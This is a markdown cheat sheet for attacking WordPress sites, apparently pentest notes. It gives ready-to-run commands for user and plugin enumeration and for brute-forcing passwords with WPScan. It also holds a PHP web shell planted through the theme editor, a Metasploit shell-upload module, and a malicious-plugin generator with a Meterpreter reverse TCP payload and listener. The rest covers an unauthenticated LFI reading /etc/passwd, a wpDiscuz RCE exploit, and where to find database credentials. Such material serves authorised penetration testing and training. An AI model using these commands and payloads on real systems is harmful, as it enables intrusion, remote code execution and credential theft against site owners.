# WordPress

## Discovery

```bash
# Version in meta tag
curl -s http://TARGET | grep 'content="WordPress'

# Version in readme
curl -s http://TARGET/readme.html

# Login page
/wp-login.php
/wp-admin/
```

---

## WPScan Enumeration

```bash
# Basic scan
wpscan --url http://TARGET

# Enumerate users
wpscan --url http://TARGET --enumerate u

# Enumerate plugins
wpscan --url http://TARGET --enumerate p

# Enumerate vulnerable plugins
wpscan --url http://TARGET --enumerate vp

# Aggressive plugin detection
wpscan --url http://TARGET --enumerate p --plugins-detection aggressive
```

---

## Brute Force (WPScan)

```bash
# XMLRPC method (faster)
wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://TARGET

# wp-login method
wpscan --password-attack wp-login -t 20 -U admin,john -P passwords.txt --url http://TARGET

# With user list file
wpscan --password-attack xmlrpc -U users.txt -P passwords.txt --url http://TARGET
```

---

## Theme Editor RCE (Authenticated)

1. Login as admin
2. `Appearance → Theme Editor`
3. Select inactive theme (e.g., Twenty Nineteen)
4. Edit `404.php`
5. Add web shell:

```php
system($_GET[0]);
```

6. Access: `http://TARGET/wp-content/themes/twentynineteen/404.php?0=id`

---

## Metasploit RCE

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set USERNAME john
set PASSWORD firebird1
set RHOSTS TARGET_IP
set VHOST blog.domain.local
set TARGETURI /
run
```

---

## Malicious plugin upload (wordpwn)

When the **Theme Editor** is disabled or PHP changes are reverted (“upload by some other means, such as SFTP”), use a **malicious plugin** instead. You need admin access (e.g. default or brute-forced creds).

**Tool:** [wetw0rk/malicious-wordpress-plugin](https://github.com/wetw0rk/malicious-wordpress-plugin) — generates a plugin zip containing a Meterpreter or webshell payload.

```bash
git clone https://github.com/wetw0rk/malicious-wordpress-plugin.git
cd malicious-wordpress-plugin

# Generate plugin with meterpreter reverse TCP (set LHOST/LPORT)
python3 wordpwn.py LHOST LPORT php/meterpreter/reverse_tcp

# Start listener
msfconsole -q -x "use multi/handler; set payload php/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; run"
```

**Upload:** As admin, go to **Plugins → Add New → Upload Plugin** and upload the generated `malicious.zip`.  
**URL:** `http://TARGET/wp-admin/plugin-install.php?tab=upload`

**Activate** the plugin, then trigger the shell:

| Trigger URL |
|-------------|
| `http://TARGET/wp-content/plugins/malicious/wetw0rk_maybe.php` |
| `http://TARGET/wp-content/plugins/malicious/QwertyRocks.php` |
| `http://TARGET/wp-content/plugins/malicious/SWebTheme.php?cmd=COMMAND` |

Use the first or second for Meterpreter; the third runs a single command via `?cmd=`. Shell runs as the web server user (e.g. www-data).

---

## Vulnerable Plugins

### mail-masta LFI (unauthenticated)

```bash
curl http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

### wpDiscuz RCE (CVE-2020-24186)

```bash
python3 wp_discuz.py -u http://TARGET -p /?p=1

# If exploit fails, use uploaded webshell
curl http://TARGET/wp-content/uploads/2021/08/SHELL.php?cmd=id
```

---

## Important Paths

| Path | Description |
|------|-------------|
| `/wp-config.php` | DB credentials |
| `/wp-content/uploads/` | Uploaded files |
| `/wp-content/plugins/` | Plugins |
| `/wp-content/themes/` | Themes |
| `/xmlrpc.php` | XML-RPC API |

---

## Config File Locations

```bash
# Linux
/var/www/html/wp-config.php
/var/www/wordpress/wp-config.php

# Database creds in wp-config.php
define('DB_NAME', 'database_name');
define('DB_USER', 'username');
define('DB_PASSWORD', 'password');
define('DB_HOST', 'localhost');
```
